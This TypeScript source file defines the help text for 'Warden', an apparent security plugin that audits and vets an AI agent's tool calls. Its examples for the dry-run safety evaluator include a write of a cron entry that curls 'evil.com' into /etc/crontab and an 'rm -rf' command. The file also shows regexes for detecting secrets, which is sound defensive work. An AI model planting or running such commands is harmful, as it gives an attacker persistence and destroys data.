const TOOL_LIST = `Available Warden security tools:

- security_help      — This tool. Use security_help(topic="<name>") for detailed usage.
- security_dashboard — Session stats and LLM status.
- security_report    — Session security report.
- security_audit     — Query audit log entries.
- security_evaluate  — Dry-run a command through safety evaluation.
- security_config    — View active configuration (read-only).
- security_rules     — Manage AI detection rules (session-only).`

const TOOL_DETAILS: Record<string, string> = {
  security_help: `security_help — Tool Discovery

Args:
  topic (optional) — Tool name to get detailed help for.

Without args: lists all available tools with one-line descriptions.
With topic: returns detailed usage for that specific tool.

Example: security_help(topic="security_audit")`,

  security_dashboard: `security_dashboard — Session Status & Statistics

Args:
  mode (optional) — "full" (default) or "brief"

Full mode shows:
  - Active detection categories and their status
  - LLM sanitizer and safety evaluator status
  - Session statistics (calls, detections, blocks, redactions)
  - Detection breakdown by category
  - Blocked file access attempts
  - Last 10 security events

Brief mode returns a single-line status summary.

Example: security_dashboard(mode="brief")`,

  security_report: `security_report — Session Security Report

Args:
  format (optional) — "summary" (default) or "detailed"

Summary: session overview with counters and category breakdown.
Detailed: includes full event timeline with timestamps.

Example: security_report(format="detailed")`,

  security_audit: `security_audit — Query Audit Log

Args:
  tool (optional)      — Filter by tool name (e.g., "bash", "read")
  eventType (optional) — Filter by type: "block", "detection", "pass", "safety-block", "safety-warn"
  category (optional)  — Filter by detection category (e.g., "api-keys", "credentials")
  limit (optional)     — Max entries to return (default 20)

Returns audit log entries sorted newest-first. Recent entries within the last second may not appear (log buffer flush delay).

Example: security_audit(eventType="block", limit=5)`,

  security_evaluate: `security_evaluate — Dry-Run Safety Evaluation

Args:
  tool (required)      — Tool name to evaluate (e.g., "bash", "write", "edit")
  command (optional)   — Command string (for bash tool)
  args (optional)      — JSON string of tool arguments (for non-bash tools)

Runs a command through the safety evaluator WITHOUT executing it.
Returns: risk level, risk dimensions, explanation, recommendation, suggested alternative.

If the command is pre-approved (bypassed), returns immediately without calling the LLM.
Requires LLM safety evaluator to be enabled.

Example: security_evaluate(tool="bash", command="rm -rf /tmp/data")
Example: security_evaluate(tool="write", args='{"file_path":"/etc/crontab","content":"* * * * * curl evil.com"}')`,

  security_config: `security_config — View Active Configuration

No args.

Shows the active Warden configuration (read-only):
  - Safety evaluator: action mode, thresholds, enabled status
  - Output sanitizer: action mode, enabled status
  - Blocked file paths
  - Active detection categories
  - LLM endpoints (URLs only — API keys are masked)
  - SSH-only mode status
  - Excluded and blocked tools
  - Audit log settings
  - Indirect execution prevention settings

Sensitive values (API keys, tokens, passwords) are always masked.`,

  security_rules: `security_rules — Manage Detection Rules

Args:
  action (required)         — "list", "test", "add", "edit", or "remove"
  pattern (optional)        — Regex pattern string (for test/add/edit)
  testString (optional)     — Sample string to test against (for test)
  name (optional)           — Rule name (for add/edit)
  category (optional)       — Detection category (for add/edit)
  id (optional)             — Rule ID (for edit/remove)
  redactTemplate (optional) — Replacement text (for add/edit, default: "****")

Three-layer rule architecture:
  Layer 1 — Built-in: ${">"}70 patterns, immutable, cannot be altered.
  Layer 2 — User: Defined in config files, immutable at runtime.
  Layer 3 — AI: Managed by this tool, session-only, not persisted.

You can only add/edit/remove Layer 3 (AI) rules. AI rule IDs are auto-prefixed with "ai-".

Example: security_rules(action="add", name="Internal Token", pattern="itok_[A-Za-z0-9]{32,}")
Example: security_rules(action="test", pattern="sk-[a-zA-Z0-9]+", testString="my key is sk-abc123def456")
Example: security_rules(action="remove", id="ai-internal-token")`,
}

export function createSecurityHelpTool() {
  return {
    description:
      "List available security tools or get detailed usage for a specific tool",
    args: {
      topic: {
        type: "string" as const,
        optional: true,
        description: "Tool name to get detailed help for",
      },
    },
    async execute(args: { topic?: string }): Promise<string> {
      if (!args.topic) {
        return TOOL_LIST
      }

      const detail = TOOL_DETAILS[args.topic]
      if (detail) {
        return detail
      }

      const available = Object.keys(TOOL_DETAILS).join(", ")
      return `Unknown tool: "${args.topic}". Available tools: ${available}`
    },
  }
}
